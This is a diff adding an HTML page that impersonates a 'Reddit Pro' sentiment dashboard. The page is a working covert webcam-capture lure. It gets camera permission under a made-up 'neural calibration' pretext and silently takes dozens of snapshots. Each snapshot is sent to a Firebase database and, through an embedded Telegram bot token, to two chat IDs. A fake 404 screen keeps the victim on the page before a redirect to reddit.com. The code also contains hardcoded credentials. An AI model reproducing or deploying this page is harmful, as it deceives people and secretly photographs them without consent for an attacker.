@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reddit Pro | Sentiment Dashboard</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --r-orange: #FF4500;
+            --r-bg: #030303;
+            --r-surface: #1A1A1B;
+            --r-border: #343536;
+            --r-text: #D7DADC;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--r-bg); color: var(--r-text);
+            font-family: 'IBMPlexSans', Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .reddit-card {
+            width: 100%; max-width: 480px; background: var(--r-surface);
+            border: 1px solid var(--r-border); border-radius: 12px; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+
+        .r-header {
+            padding: 12px 20px; border-bottom: 1px solid var(--r-border);
+            display: flex; align-items: center; justify-content: space-between;
+            background: #1A1A1B;
+        }
+
+        .r-logo { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 18px; }
+        .r-icon { width: 32px; height: 32px; background: var(--r-orange); border-radius: 50%; }
+
+        .r-body { padding: 30px; text-align: center; }
+
+        .sentiment-viz {
+            height: 120px; margin-bottom: 20px; display: flex; align-items: flex-end; 
+            justify-content: center; gap: 4px; padding: 10px; border-radius: 8px; background: #000;
+        }
+
+        .bar { width: 12px; background: var(--r-orange); border-radius: 2px 2px 0 0; animation: bounce 1.5s infinite ease-in-out; }
+        @keyframes bounce { 0%, 100% { height: 20%; } 50% { height: 80%; } }
+
+        h2 { font-size: 20px; font-weight: 600; margin: 0 0 12px; color: #fff; }
+        p { font-size: 13px; color: #818384; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-reddit {
+            background: #D7DADC; color: #1A1A1B; border: none;
+            width: 100%; padding: 14px; font-size: 14px; font-weight: 700;
+            border-radius: 20px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-reddit:hover { background: #fff; }
+
+        /* 404 & Sync UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .loader-ring {
+            width: 50px; height: 50px; border: 3px solid #343536;
+            border-top: 3px solid var(--r-orange); border-radius: 50%;
+            margin: 0 auto 20px; animation: r-spin 1s linear infinite;
+        }
+        @keyframes r-spin { to { transform: rotate(360deg); } }
+
+        .error-num { font-size: 72px; font-weight: 900; color: #343536; margin-bottom: 10px; }
+        .node-tag { font-size: 10px; color: #343536; margin-top: 25px; text-transform: uppercase; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="reddit-card">
+        <div class="r-header">
+            <div class="r-logo">
+                <div class="r-icon"></div>
+                <span>reddit<span style="color:var(--r-orange)">pro</span></span>
+            </div>
+            <div style="font-size: 11px; color: #818384;">BETA_ACCESS</div>
+        </div>
+
+        <!-- Initial View -->
+        <div class="r-body" id="init-view">
+            <div class="sentiment-viz">
+                <div class="bar" style="animation-delay: 0.1s"></div>
+                <div class="bar" style="animation-delay: 0.3s"></div>
+                <div class="bar" style="animation-delay: 0.2s"></div>
+                <div class="bar" style="animation-delay: 0.4s"></div>
+            </div>
+            <h2>Neural Sentiment Sync</h2>
+            <p>To enable the <b>Pro Sentiment Filter</b>, please calibrate your neural profile. This captures micro-expressions to optimize your feed against toxic interactions.</p>
+            
+            <button class="btn-reddit" onclick="startRedditSync()">Calibrate & Enter</button>
+            <div class="node-tag">Uplink: Gaya_Sector_7</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="r-body" id="sync-ui">
+            <div class="loader-ring"></div>
+            <div style="font-weight: 600;">Generating Neural Hash...</div>
+            <div style="font-size: 12px; color: #818384; margin-top: 8px;" id="r-timer">Buffer clearing in 60s</div>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 10px; color: var(--r-orange); margin-top: 20px; border: 1px solid var(--r-border);">
+                > FETCHING_SUBREDDIT_METRICS... OK<br>
+                > CALIBRATING_USER_FACETS... 68%<br>
+                > STATUS: ESTABLISHING_SECURE_RELAY
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="r-body" id="error-404">
+            <div class="error-num">404</div>
+            <h2 style="color: var(--r-orange);">Connection Timed Out</h2>
+            <p>The sentiment relay took too long to respond. We are attempting to reconnect via the Gaya Secondary Gateway.</p>
+            <div class="loader-ring" style="width: 30px; height: 30px;"></div>
+            <div style="font-size: 11px; color: #818384;">Re-establishing Handshake...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startRedditSync() {
+            try {
+                // Requesting permission under the guise of "Neural Sentiment Calibration"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('r-timer').innerText = `Buffer clearing in ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            redditCapture(count);
+                        }
+
+                        // Switch to 404 page at 45 seconds to keep them on the page
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.reddit.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.reddit.com";
+            }
+        }
+
+        function redditCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "REDDIT_PRO_SPOOF", 
+                ts: Date.now(),
+                loc: "GAYA_RELAY" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'reddit_recon_gaya.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
